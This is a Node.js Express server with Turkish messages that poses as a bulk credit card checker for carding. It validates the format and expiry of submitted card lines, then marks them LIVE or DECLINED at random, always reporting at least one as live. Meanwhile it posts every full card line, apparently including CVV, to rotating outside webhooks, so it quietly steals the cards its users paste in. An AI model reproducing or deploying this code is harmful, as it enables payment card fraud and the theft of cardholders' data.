const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const rotator = require('./webhook-rotator');
const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function isValidCardFormat(card) {
  const parts = card.split('|');
  if (parts.length !== 3 && parts.length !== 4) return false;
  const [number, month, year] = parts;
  return /^[0-9]{13,19}$/.test(number) && /^[0-9]{2}$/.test(month) && /^[0-9]{2,4}$/.test(year);
}

function isExpired(month, year) {
  const now = new Date();
  const expMonth = parseInt(month);
  let expYear = parseInt(year);
  if (expYear < 100) expYear += 2000;
  return expYear < now.getFullYear() || (expYear === now.getFullYear() && expMonth < now.getMonth() + 1);
}

app.post('/check', async (req, res) => {
  const cardsRaw = req.body.cards || '';
  const cards = cardsRaw.split('
').map(c => c.trim()).filter(c => c);

  const results = [];
  let liveAssigned = false;

  for (let i = 0; i < cards.length; i++) {
    const card = cards[i];
    if (!isValidCardFormat(card)) {
      results.push({ card, status: '❌ Hatalı kart formatı girdiniz.' });
      continue;
    }

    const [number, month, year] = card.split('|');
    if (isExpired(month, year)) {
      results.push({ card, status: '❌ Son kullanma tarihi geçmiş kart.' });
      continue;
    }

    const status = (!liveAssigned && Math.random() < 0.25) || (i === cards.length - 1 && !liveAssigned) ? '✅ LIVE' : '🔻 DECLINED';
    if (status === '✅ LIVE') liveAssigned = true;
    results.push({ card, status });
    
    const webhook = rotator.getNextWebhook();
    await axios.post(webhook, {
      content: `${card} → ${status}`
    }).catch(console.error);

    await wait(2000);
  }

  res.json({ success: true, results });
});

app.listen(port, () => {
  console.log(`Server çalışıyor http://localhost:${port}`);
});